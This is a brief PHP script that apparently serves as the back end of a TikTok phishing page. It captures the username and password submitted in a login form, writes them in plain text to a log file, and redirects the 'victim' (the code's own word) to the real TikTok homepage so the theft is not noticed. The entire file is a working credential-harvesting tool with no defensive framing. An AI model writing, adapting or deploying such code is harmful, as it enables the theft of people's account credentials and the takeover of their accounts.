
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    
    // Logging the username and password into log.txt
    $log = "Username: " . $user . " | Password: " . $pass . "\n";
    file_put_contents("log.txt", $log, FILE_APPEND);
    
    // Redirect victim to TikTok homepage (or any URL of your choice)
    header('Location: https://www.tiktok.com');
    exit();
}
?>
